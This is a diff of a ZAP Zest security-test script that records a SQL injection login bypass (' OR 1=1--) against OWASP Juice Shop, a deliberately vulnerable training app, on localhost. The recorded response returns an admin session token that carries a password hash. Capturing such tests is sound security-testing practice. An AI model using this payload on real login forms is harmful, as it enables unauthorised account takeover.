@@ -13,18 +13,13 @@
   },
   "statements": [
     {
-      "type": "ZestClientScript",
-      "script": "println('Starting SQL injection test...');",
-      "elementType": "ZestClientScript"
-    },
-    {
       "url": "http://localhost:3000/rest/user/login",
-      "data": "{\"email\":\"' OR 1=1--\",\"password\":\"password123\"}",
+      "data": "{\"email\":\"\u0027 OR 1\u003d1--\",\"password\":\"password123\"}",
       "method": "POST",
-      "headers": "Proxy-Connection: keep-alive\r\nContent-Length: 47\r\nsec-ch-ua-platform: \"macOS\"\r\nsec-ch-ua: \"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"\r\nContent-Type: application/json\r\nsec-ch-ua-mobile: ?0\r\nOrigin: http://localhost:3000\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\n",
+      "headers": "Proxy-Connection: keep-alive\r\nContent-Length: 47\r\nsec-ch-ua-platform: \"macOS\"\r\nsec-ch-ua: \"Not A(Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"132\", \"Google Chrome\";v\u003d\"132\"\r\nContent-Type: application/json\r\nsec-ch-ua-mobile: ?0\r\nOrigin: http://localhost:3000\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\n",
       "response": {
         "url": "http://localhost:3000/rest/user/login",
-        "headers": "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: SAMEORIGIN\r\nFeature-Policy: payment 'self'\r\nX-Recruiting: /#/jobs\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 811\r\nETag: W/\"32b-IcnTH24e56RHRNrbXe3Ckslgcg4\"\r\nVary: Accept-Encoding\r\nDate: Wed, 05 Feb 2025 18:53:40 GMT\r\nConnection: keep-alive\r\nKeep-Alive: timeout=5\r\n\r\n",
+        "headers": "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: SAMEORIGIN\r\nFeature-Policy: payment \u0027self\u0027\r\nX-Recruiting: /#/jobs\r\nContent-Type: application/json; charset\u003dutf-8\r\nContent-Length: 811\r\nETag: W/\"32b-IcnTH24e56RHRNrbXe3Ckslgcg4\"\r\nVary: Accept-Encoding\r\nDate: Wed, 05 Feb 2025 18:53:40 GMT\r\nConnection: keep-alive\r\nKeep-Alive: timeout\u003d5\r\n\r\n",
         "body": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMjcuMC4wLjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDItMDUgMTU6NTQ6MDMuNjIwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDItMDUgMTg6NDI6MzEuODM0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTczODc4MTYyMX0.cuNdO0y8-1sC1skrFrHxly1pWO8CK_mVrmNXZjKiM9nP1EkvJX5O52EJd3_y6VCStRtEmpxA77lQBm2ib30ey3HeFlFSqfEAvh5elX78WSL2Myq6ZmHtVHt3MGGLBZChaWMiP1GlWoTuc0LxMyemck6YfGn_yOT1GNJer9ExTho\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
         "statusCode": 200,
         "responseTimeInMs": 42,
